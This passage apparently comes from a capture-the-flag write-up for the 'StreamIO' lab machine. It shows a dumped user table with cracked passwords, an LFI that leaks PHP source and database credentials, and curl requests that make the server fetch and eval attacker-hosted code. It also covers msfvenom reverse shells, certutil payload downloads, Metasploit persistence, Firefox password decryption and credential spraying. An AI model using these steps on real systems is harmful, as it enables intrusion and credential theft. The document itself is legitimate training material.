[05:54:38] [INFO] retrieved: Robin
[06:00:59] [INFO] retrieved: 3
[06:01:04] [INFO] retrieved: c660060492d9edcaa8332d89c99c9239
[06:06:03] [INFO] retrieved: James
[06:12:20] [INFO] retrieved: 30
[06:12:27] [INFO] retrieved: 384463526d288edcc95fc3701e523bc7
[06:17:20] [INFO] retrieved: Stan
[06:23:45] [INFO] retrieved: 31
[06:23:53] [INFO] retrieved: b779ba15cedfd22a023c4d8bcf5f2332
[06:28:47] [INFO] retrieved: yoshihide
[06:34:55] [INFO] retrieved: 4
[06:35:01] [INFO] retrieved: 925e5408ecb67aea449373d668b7359e
[06:40:02] [INFO] retrieved: Theodore
[06:46:15] [INFO] retrieved: 5
[06:46:20] [INFO] retrieved: 083ffae904143c4796e464dac33c1f7d
[06:51:20] [INFO] retrieved: Samantha
[06:57:26] [INFO] retrieved: 6
[06:57:32] [INFO] retrieved: 08344b85b329d7efd611b7a7743e8a09
[07:02:47] [INFO] retrieved: Lauren
[07:09:04] [INFO] retrieved: 7
[07:09:10] [INFO] retrieved: d62be0dc82071bccc1322d64ec5b6c51
[07:14:01] [INFO] retrieved: William
[07:20:13] [INFO] retrieved: 8
[07:20:20] [INFO] retrieved: f87d3c0d6c8fd686aacc6627f1f493a5
[07:25:36] [INFO] retrieved: Sabrina
[07:31:45] [INFO] retrieved: 9
[07:31:50] [INFO] retrieved: f03b910e2bd0313a23fdd7575f34a694
[07:37:06] [INFO] retrieved: Robert
Database: STREAMIO
Table: users
[29 entries]
+----+-----------+----------------------------------+
| id | username  | password                         |
+----+-----------+----------------------------------+
| 10 | Thane     | 3577c47eb1e12c8ba021611e1280753c |
| 11 | Carmon    | 35394484d89fcfdb3c5e447fe749d213 |
| 12 | Barry     | 54c88b2dbd7b1a84012fabc1a4c73415 |
| 13 | Oliver    | fd78db29173a5cf701bd69027cb9bf6b |
| 14 | Michelle  | b83439b16f844bd6ffe35c02fe21b3c0 |
| 15 | Gloria    | 0cfaaaafb559f081df2befbe66686de0 |
| 16 | Victoria  | b22abb47a02b52d5dfa27fb0b534f693 |
| 17 | Alexendra | 1c2b3d8270321140e5153f6637d3ee53 |
| 18 | Baxter    | 22ee218331afd081b0dcd8115284bae3 |
| 19 | Clara     | ef8f3d30a856cf166fb8215aca93e9ff |
| 20 | Barbra    | 3961548825e3e21df5646cafe11c6c76 |
| 21 | Lenord    | ee0b8a0937abd60c2882eacb2f8dc49f |
| 22 | Austin    | 0049ac57646627b8d7aeaccf8b6a936f |
| 23 | Garfield  | 8097cedd612cc37c29db152b6e9edbd3 |
| 24 | Juliette  | 6dcd87740abb64edfa36d170f0d5450d |
| 25 | Victor    | bf55e15b119860a6e6b5a164377da719 |
| 26 | Lucifer   | 7df45a9e3de3863807c026ba48e55fb3 |
| 27 | Bruno     | 2a4e2cf22dd8fcb45adcb91be1e22ae8 |
| 28 | Diablo    | ec33265e5fc8c2f1b0c137bb7b3632b5 |
| 29 | Robin     | dc332fb5576e9631c9dae83f194f8e70 |
| 3  | James     | c660060492d9edcaa8332d89c99c9239 |
| 30 | Stan      | 384463526d288edcc95fc3701e523bc7 |
| 31 | yoshihide | b779ba15cedfd22a023c4d8bcf5f2332 |
| 4  | Theodore  | 925e5408ecb67aea449373d668b7359e |
| 5  | Samantha  | 083ffae904143c4796e464dac33c1f7d |
| 6  | Lauren    | 08344b85b329d7efd611b7a7743e8a09 |
| 7  | William   | d62be0dc82071bccc1322d64ec5b6c51 |
| 8  | Sabrina   | f87d3c0d6c8fd686aacc6627f1f493a5 |
| 9  | Robert    | f03b910e2bd0313a23fdd7575f34a694 |
+----+-----------+----------------------------------+
```

As you can see, this takes 5 hours, 32 minutes, and 13 seconds to run, so there is likely a faster way. Cracking the passwords with [CrackStation](https://crackstation.net/) finds the following (user's not shown could not be cracked with CrackStation):

| Username  | Hash                             | Password          |
|-----------|----------------------------------|-------------------|
| Thane     | 3577c47eb1e12c8ba021611e1280753c | highschoolmusical |
| Barry     | 54c88b2dbd7b1a84012fabc1a4c73415 | $hadoW            |
| Michelle  | b83439b16f844bd6ffe35c02fe21b3c0 | !?Love?!123       |
| Victoria  | b22abb47a02b52d5dfa27fb0b534f693 | !5psycho8!        |
| Clara     | ef8f3d30a856cf166fb8215aca93e9ff | %$clara           |
| Lenord    | ee0b8a0937abd60c2882eacb2f8dc49f | physics69i        |
| Juliette  | 6dcd87740abb64edfa36d170f0d5450d | $3xybitch         |
| Bruno     | 2a4e2cf22dd8fcb45adcb91be1e22ae8 | $monique$1991$    |
| yoshihide | b779ba15cedfd22a023c4d8bcf5f2332 | 66boysandgirls..  |
| Lauren    | 08344b85b329d7efd611b7a7743e8a09 | ##123a8j8w5123##  |
| Sabrina   | f87d3c0d6c8fd686aacc6627f1f493a5 | !!sabrina$        |

Out of these, the only login that works is `yoshihide:66boysandgirls..`.

### Admin Panel

We are redirected to the home page, but since we know the adddress of the admin page (`https://streamio.htb/admin/index.php`), let's go there:

![](screenshots/Screenshot%202022-07-29%20at%2012-36-44%20Admin%20panel.png)

Clicking the links at the top changes parameter in the URL. For instance, in the screenshot above, the URL is `https://streamio.htb/admin/index.php?staff=` for the staff list. For "Movie management" the URL is `https://streamio.htb/admin/index.php?movie=` and for "User management" the URL is `https://streamio.htb/admin/index.php?user=`.

Let's fuzz this parameter by running `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u https://streamio.htb/admin/index.php\?FUZZ\= -b "PHPSESSID=95aolvr8otpu56btshfqv66f2a" -fs 1678`. We are specifying the `PHPSESSID` cookie because we need an authenticated session to access the admin page.

```
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 34ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 35ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 45ms]
debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 36ms]
:: Progress: [87651/87651] :: Job [1/1] :: 1293 req/sec :: Duration: [0:02:07] :: Errors: 0 ::
```

Going to `https://streamio.htb/admin/index.php?debug=` says "this option is for developers only." We fuzz for a LFI exploit by running `ffuf -ic -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u https://streamio.htb/admin/index.php\?debug\=FUZZ -b "PHPSESSID=95aolvr8otpu56btshfqv66f2a" -fs 1712`:

```
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 2577, Words: 262, Lines: 71, Duration: 33ms]
C:/Windows/win.ini      [Status: 200, Size: 1804, Words: 95, Lines: 57, Duration: 33ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml  [Status: 200, Size: 46280, Words: 8867, Lines: 719, Duration: 38ms]
:: Progress: [73/73] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

So, we found an LFI exploit on a URL parameter in a PHP application. We can use PHP filter URIs to get file contents by running `https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php` (we know of `master.php` from fuzzing earlier, [more info from HackTricks about PHP filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter)). Then, just base64 decode the data:

```php
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

Let's also get the `index.php` file by running `https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php`:

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```

We get some credentials to the `STREAMIO` database: `db_admin:B1@hx31234567890`.

## Foothold

Importantly, the `index.php` script sets `included` to true (`define('included',true);`), which means if we set the `debug` GET parameter to `master.php` it will not die immediately since the `!defined('included')` check will pass.

`master.php` has the below code:

```php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
```

It will execute the contents of the file path ([`file_get_contents` documentation](https://www.php.net/manual/en/function.file-get-contents.php)) passed in through a POST parameter called `include`... as long as the `included` variable is true, which it will be if `index.php` excutes before `master.php`. So, if we POST to `https://streamio.htb/admin/index.php?debug=master.php` we can specify an `include` with a file path to execute. By the way, [making a POST request with GET parameters](https://stackoverflow.com/a/10426554) is okay.

`file_get_contents` can make a web request according to the documentation:

```php
<?php
$homepage = file_get_contents('http://www.example.com/');
echo $homepage;
?>
```

So, let's start a webserver with `python -m http.server 8000` and create a file called `exploit` with the contents `echo(system("dir"));`. Then, we can make the POST request with `curl --insecure -b "PHPSESSID=95aolvr8otpu56btshfqv66f2a" -X POST --data "include=http://10.10.14.98:8000/exploit" https://streamio.htb/admin/index.php\?debug\=master.php | grep "<input name=\"include\" hidden>" -A 9999`:

```

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  335k  100  335k  100    39   748k     87 --:--:-- --:--:-- --:--:--  750k
<input name="include" hidden>
</form>
 Volume in drive C has no label.
 Volume Serial Number is A381-2B63

 Directory of C:\inetpub\streamio.htb\admin

02/22/2022  03:49 AM    <DIR>          .
02/22/2022  03:49 AM    <DIR>          ..
02/22/2022  03:49 AM    <DIR>          css
02/22/2022  03:49 AM    <DIR>          fonts
02/22/2022  03:49 AM    <DIR>          images
06/03/2022  01:51 AM             2,401 index.php
02/22/2022  04:19 AM    <DIR>          js
06/03/2022  01:53 AM             3,055 master.php
02/23/2022  03:16 AM               878 movie_inc.php
02/23/2022  03:16 AM               936 staff_inc.php
02/23/2022  03:16 AM               879 user_inc.php
               5 File(s)          8,149 bytes
               6 Dir(s)   7,143,124,992 bytes free
               6 Dir(s)   7,143,124,992 bytes free              </div>
        </center>
</body>
</html>
```

We get a directory listing! We can execute commands!

We will use Metasploit to get a reverse shell ([other reverse shell options](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows)). Create PHP payload by running `msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=38121 -f raw > shell.php`.

Then, run the following commands to start the Metasploit listener:

```
$ sudo msfconsole
msf6 > use exploit/multi/handler
msf6 > options
msf6 > set payload php/meterpreter_reverse_tcp
msf6 > options
msf6 > set LHOST tun0
msf6 > set LPORT 38121
msf6 > run
```

Next, start the webserver with `python -m http.server 8000` so PHP can download our `shell.php` file. Finally, run the POST request with `curl --insecure -b "PHPSESSID=95aolvr8otpu56btshfqv66f2a" -X POST --data "include=http://10.10.14.98:8000/shell.php" https://streamio.htb/admin/index.php\?debug\=master.php`. When the POST request is sent, PHP will read the contents of `http://10.10.14.98:8000/shell.php` and run `eval` on them, giving us a meterpreter session.

You can switch back to the Metasploit shell by running `background` and then switch back to the meterpreter using `sessions -i 1`.

This shell keeps crashing, so are going to try a different method. Create a meterpreter executable with `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.98 LPORT=38122 -f exe > exploit.exe`. Then, in our `exploit` file paste in `system("certutil.exe -urlcache -f http://10.10.14.98:8000/exploit.exe C:\\windows\\temp\\exploit.exe");`, which is a command that will download our newly create meterpreter `exploit.exe`. Then, send off a POST request with `curl --insecure -b "PHPSESSID=95aolvr8otpu56btshfqv66f2a" -X POST --data "include=http://10.10.14.98:8000/exploit" https://streamio.htb/admin/index.php\?debug\=master.php`:

```
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Now, we just need to execute that program. So, edit the `exploit` file again and replace its contents with `system("C:\\windows\\temp\\exploit.exe");` to run the program. Make sure the webserver is still running (`python -m http.server 8000`). Start a Metasploit listener by running the following commands:

```
$ sudo msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST tun0
msf6 > set LPORT 38122
msf6 > run
```

Then, send the POST request again: `curl --insecure -b "PHPSESSID=95aolvr8otpu56btshfqv66f2a" -X POST --data "include=http://10.10.14.98:8000/exploit" https://streamio.htb/admin/index.php\?debug\=master.ph`.

Ger persistance by running the following:

```
background
msf6 > use exploit/windows/local/persistence
msf6 > set DELAY 60
msf6 > set SESSION 3
msf6 > set LHOST tun0
msf6 > set LPORT 59029
run
```

This will output the following:

```
[*] Running persistent module against DC via session ID: 3
[+] Persistent VBS script written on DC to C:\Windows\TEMP\pIEzlxOGXTTFd.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DwXCpDwC
[-] Failed to make entry in the registry for persistence
```

We need higher privileges so maybe we can do this later.

Upload [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) with `upload tools/winPEASx64.exe`. Create a shell with `shell` in the meterpreter and then type `winPEASx64.exe log` to run WinPEAS. The `log` option redirects all output to `out.txt`, which is useful since it winPEAS will print 10,000+ lines of output in this scenario. You can download the report by running `download out.txt` form the meterpreter (exit the shell first by running `exit`): [winpeas_report_yoshihide.txt](winpeas_report_yoshihide.txt). Read the report with `less -r winpeas_report_yoshihide.txt`.

We got some information about other users:

```
Computer Name           :   DC
User Name               :   JDgodd
User Id                 :   1104
Is Enabled              :   True
User Type               :   User
Comment                 :   
Last Logon              :   2/26/2022 10:17:08 AM
Logons Count            :   8
Password Last Set       :   2/22/2022 2:56:42 AM

=================================================================================================

Computer Name           :   DC
User Name               :   Martin
User Id                 :   1105
Is Enabled              :   True
User Type               :   Administrator
Comment                 :   
Last Logon              :   7/29/2022 7:58:39 PM
Logons Count            :   77
Password Last Set       :   5/26/2022 4:16:42 PM

=================================================================================================

Computer Name           :   DC
User Name               :   nikk37
User Id                 :   1106
Is Enabled              :   True
User Type               :   User
Comment                 :   
Last Logon              :   2/22/2022 2:39:51 AM
Logons Count            :   3
Password Last Set       :   2/22/2022 2:57:16 AM
```

From the "Current TCP Listening Ports" we can figure out that the SQL server port is `1433`:

```
╔══════════╣ Current TCP Listening Ports
╚ Check for services restricted from the outside                                                                                                                                                           
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               88            0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         892             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               443           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         892             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         3580            sqlservr
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               9389          0.0.0.0               0               Listening         2636            Microsoft.ActiveDirectory.WebServices
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         492             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1088            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1496            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               49673         0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               49674         0.0.0.0               0               Listening         632             lsass
  TCP        0.0.0.0               49689         0.0.0.0               0               Listening         624             services
  TCP        0.0.0.0               49704         0.0.0.0               0               Listening         2844            dns
  TCP        0.0.0.0               56312         0.0.0.0               0               Listening         2772            dfsrs
  TCP        10.10.11.158          53            0.0.0.0               0               Listening         2844            dns
  TCP        10.10.11.158          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.11.158          60110         10.10.14.98           38122           Established       4508            C:\windows\temp\exploit.exe
  TCP        127.0.0.1             53            0.0.0.0               0               Listening         2844            dns
```

We got some credentials for the database from dumping the source of the website: `db_admin:B1@hx31234567890`. Let's try to authenticate to the database with those credentials and see if we can find anything. [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#having-credentials) has information about enumerating MS SQL if you have credentials.

In the meterpreter session we can forward the port to our attacker machine with `portfwd add -l 1433 -p 1433 -r localhost`.

Then, we ca try one of the methods from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#having-credentials) for connecting to the database. I first tried `sqsh -S localhost -U db_admin -P B1@hx31234567890 -D streamio_backup`, which worked but it seemed complicated. So, I tried `sqlmap -d mssql://db_admin:B1@hx31234567890@localhost:1433/streamio_backup --dump`, which couldn't deal with the `@` in the password. I ended up using [impacket](https://github.com/SecureAuthCorp/impacket)'s [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).

```
$ python3 examples/mssqlclient.py 'db_admin:B1@hx31234567890'@127.0.0.1 -port 1433
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC): Line 1: Changed database context to 'master'.
[*] INFO(DC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL> SELECT name FROM master.dbo.sysdatabases
name

--------------------------------------------------------------------------------------------------------------------------------

master

tempdb

model

msdb

STREAMIO

streamio_backup

SQL> use streamio_backup;
[*] ENVCHANGE(DATABASE): Old Value: streamio_backup, New Value: streamio_backup
[*] INFO(DC): Line 1: Changed database context to 'streamio_backup'.
SQL> SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' (command from https://stackoverflow.com/a/175446)
TABLE_CATALOG                                                                                                                      TABLE_SCHEMA                                                                                                                       TABLE_NAME                                                                                                                         TABLE_TYPE

--------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ----------

streamio_backup                                                                                                                    dbo                                                                                                                                movies                                                                                                                             b'BASE TABLE'

streamio_backup                                                                                                                    dbo                                                                                                                                users                                                                                                                              b'BASE TABLE'

SQL> select * from users;
         id   username                                             password

-----------   --------------------------------------------------   --------------------------------------------------

          1   nikk37                                               389d14cb8e4e9b94b137deb1caf0612a

          2   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332

          3   James                                                c660060492d9edcaa8332d89c99c9239

          4   Theodore                                             925e5408ecb67aea449373d668b7359e

          5   Samantha                                             083ffae904143c4796e464dac33c1f7d

          6   Lauren                                               08344b85b329d7efd611b7a7743e8a09

          7   William                                              d62be0dc82071bccc1322d64ec5b6c51

          8   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5
```

This gives us a new user, `nikk37`, and their hash, `389d14cb8e4e9b94b137deb1caf0612a`. Putting this into [CrackStation](https://crackstation.net/) gives us a password of `get_dem_girls2@yahoo.com`.

Trying those credentials with [evil-winrm](https://github.com/Hackplayers/evil-winrm) works: `evil-winrm -u nikk37 -p get_dem_girls2@yahoo.com -i streamio.htb`

We can now run `cat C:\Users\nikk37\Desktop\user.txt` and finally get the `user.txt` flag.

## Lateral Movement

Upload WinPEAS with `upload tools/winPEASx64.exe` in evil-winrm and then run it with `.\winPEASx64.exe log`. Download the output with `download out.txt`: [winpeas_report_nikk37.txt](winpeas_report_nikk37.txt). Read the report with `less -r winpeas_report_nikk37.txt`.

We get some good output:

```
╔══════════╣ Looking for Firefox DBs
╚  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
╚ Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

Running the suggested tool, [SharpWeb](https://github.com/djhohnstein/SharpWeb) finding nothing:

```


=== Checking for Firefox (Current User) ===

```

Researching other tools finds [unode/firefox_decrypt](https://github.com/unode/firefox_decrypt) and [lclevy/firepwd](https://github.com/lclevy/firepwd). We'll use `firepwd` since it doesn't need the entire Firefox profile.

Download `C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db` and `C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json` to the same directory as `firepwn` and then run `python firepwd.py`:

```
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

We have several new credentials and a new virtual host. Let's add the `slack.streamio.htb` domain to `/etc/hosts`: `echo "10.10.11.158 slack.streamio.htb" | sudo tee -a /etc/hosts`.

Let's fuzz for directories: `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u https://slack.streamio.htb/FUZZ`, which finds nothing. Checking for `php` files also finds nothing.

We can check if we have a valid set of credentials by putting our current usernames (`JDgodd`, `Martin`, `nikk37`) in a file called `users.txt` and passwords in a file called `passwords.txt`, and then running `crackmapexec smb streamio.htb -u users.txt -p passwords.txt` ([relevant documentation](https://wiki.porchetta.industries/smb-protocol/authentication/checking-credentials-domain), [GitHub repo](https://github.com/Porchetta-Industries/CrackMapExec)):

```
SMB         streamIO.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         streamIO.htb    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

So, we know that `JDgodd:JDg0dd1s@d0p3cr3@t0r` is a valid login, but it won't work with evil-winrm.

## Privilege Escalation

Let's scan the machine using [BloodHound](https://github.com/BloodHoundAD/BloodHound): "BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a C# data collector. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify."

BloodHound only analyzes data though. We need to use [SharpHound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html) ([download](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)) to collect data. There are other data collectors but SharpHound is the only officially support collector.

Upload SharpHound.exe and run it:

```
*Evil-WinRM* PS C:\Users\nikk37\Documents> .\SharpHound.exe
2022-07-29T23:35:16.1106010-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
